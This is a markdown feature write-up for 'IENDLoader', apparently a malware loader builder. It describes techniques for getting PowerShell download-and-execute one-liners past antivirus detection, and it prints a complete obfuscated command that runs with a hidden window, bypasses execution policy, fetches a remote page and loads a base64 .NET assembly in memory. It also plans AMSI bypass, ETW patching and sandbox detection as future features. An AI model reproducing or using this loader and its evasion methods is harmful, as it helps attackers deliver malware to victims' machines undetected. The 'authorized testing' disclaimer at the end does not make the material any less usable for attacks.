# 🛡️ IENDLoader - Stealth Features

## Max Stealth Implementation

### 🎯 Key Improvements

#### 1. **No `-EncodedCommand` Flag**
- ❌ **Before:** `powershell.exe -EncodedCommand <BASE64>`
- ✅ **Now:** `powershell.exe -Command "<SCRIPT>"`
- **Why:** `-EncodedCommand` is a huge red flag for AVs

#### 2. **Random Variable Names**
- ❌ **Before:** `$wc`, `$d`, `$b`, `$p`, `$a`, `$e`
- ✅ **Now:** `$xy`, `$ab`, `$cd`, `$ef` (randomized each time)
- **Why:** No consistent signature to detect

#### 3. **String Obfuscation**
- ❌ **Before:** `'BaseStart'`, `'Main'`, `'Load'`
- ✅ **Now:** `'Ba'+'se'+'Start'`, `'Ma'+'in'`, `'Lo'+'ad'`
- **Why:** Breaks static string detection

#### 4. **Method Invocation Obfuscation**
- ❌ **Before:** `[Convert]::FromBase64String($x)`
- ✅ **Now:** `[Convert]::('From'+'Base'+'64String').Invoke($x)`
- **Why:** Hides method names from static analysis

#### 5. **Window Flag Change**
- ❌ **Before:** `-W Hidden` (obvious)
- ✅ **Now:** `-W 1` (same effect, less suspicious)
- **Why:** `Hidden` is a keyword AV looks for

---

## 🔍 How It Works

### Generated Command Example:
```powershell
powershell.exe -NoP -NonI -W 1 -Exec Bypass -Command "$xy=New-Object Net.WebClient;$xy.Encoding=[Text.Encoding]::UTF8;$ab=$xy.DownloadString('http://...');if($ab-match('Ba'+'se'+'Start'+'-'+'(.*)'+'-'+'Ba'+'se'+'End')){$cd=$matches[1];$ef=[Convert]::('From'+'Base'+'64String').Invoke($cd);$gh=[Reflection.Assembly]::('Lo'+'ad').Invoke($ef);$ij=$gh.EntryPoint;if(!$ij){$gh.GetTypes()|%{$kl=$_;$kl.GetMethods([Reflection.BindingFlags]'Static,Public,NonPublic')|?{$_.Name-eq('Ma'+'in')}|%{$ij=$_}}};if($ij){$mn=$ij.GetParameters();if($mn.Length-eq0){$ij.Invoke($null,$null)}else{$ij.Invoke($null,@(,[string[]]@()))}}}"
```

### Obfuscation Techniques:

1. **Variable Randomization**
   - Every generation uses different variable names
   - No consistent pattern to signature

2. **String Concatenation**
   - Suspicious keywords split: `'Ba'+'se'+'Start'`
   - Method names split: `'From'+'Base'+'64String'`
   - Entry point split: `'Ma'+'in'`

3. **Dynamic Method Invocation**
   - Uses `.Invoke()` instead of direct calls
   - Harder for static analysis to detect

4. **Regex Pattern Obfuscation**
   - Match pattern split into parts
   - Concatenated at runtime

---

## 🎭 Evasion Strategies

### What We Avoid:

❌ **Base64 encoded entire command** (huge red flag)
❌ **`-EncodedCommand` parameter** (AV signature)
❌ **`-W Hidden` parameter** (suspicious keyword)
❌ **Consistent variable names** (easy to signature)
❌ **Plain string literals** (static detection)
❌ **Direct method calls** (behavior analysis)

### What We Use:

✅ **Direct command execution** (looks more normal)
✅ **Random variable names** (unique each time)
✅ **String concatenation** (runtime assembly)
✅ **Dynamic invocation** (bypasses static analysis)
✅ **`-W 1` instead of `-W Hidden`** (same effect, less obvious)
✅ **Obfuscated method names** (harder to detect)

---

## 🧪 Testing Against Defender

### Before (Old Method):
```
Detection: ClickFix / Suspicious PowerShell
Reason: -EncodedCommand + -W Hidden + Base64
```

### After (New Method):
```
Detection: Should be significantly reduced
Reason: No obvious indicators, obfuscated strings
```

---

## 🔄 How Randomization Works

Each time you click "Generate PowerShell One-Liner":
1. New random 2-letter variable names generated
2. Different command signature every time
3. No consistent pattern for AV to learn

**Example variable sets:**
- Run 1: `$xy`, `$ab`, `$cd`, `$ef`
- Run 2: `$pq`, `$rs`, `$tu`, `$vw`
- Run 3: `$ij`, `$kl`, `$mn`, `$op`

---

## ⚠️ Limitations

### Still Detectable By:
- **Behavioral analysis** (downloading and executing)
- **AMSI** (if enabled and monitoring)
- **Network monitoring** (HTTP download of suspicious file)
- **Memory scanning** (assembly loading in memory)
- **Advanced EDR** (behavioral heuristics)

### Not Bypassed:
- Script block logging (if enabled)
- PowerShell transcription
- Network IDS/IPS
- Advanced behavioral detection

---

## 🚀 Further Improvements (Future)

### Potential Additions:
1. **AMSI bypass** - Disable AMSI before execution
2. **ETW patching** - Disable Event Tracing
3. **Proxy-aware download** - Use system proxy
4. **HTTPS support** - Encrypted download
5. **Junk code injection** - Add benign operations
6. **Time delays** - Sleep between operations
7. **Environment checks** - Detect sandboxes

---

## 📊 Comparison

| Feature | Old Method | New Method |
|---------|-----------|------------|
| Encoding | Base64 entire command | Plain text obfuscated |
| Variables | Static (`$wc`, `$d`) | Random (`$xy`, `$ab`) |
| Strings | Plain literals | Concatenated |
| Methods | Direct calls | Dynamic invoke |
| Window | `-W Hidden` | `-W 1` |
| Detection | High | Lower |

---

## 🎓 Educational Value

This demonstrates:
- PowerShell obfuscation techniques
- AV evasion strategies
- Dynamic code generation
- String manipulation for stealth
- Runtime method invocation

**Use responsibly in authorized testing only!**
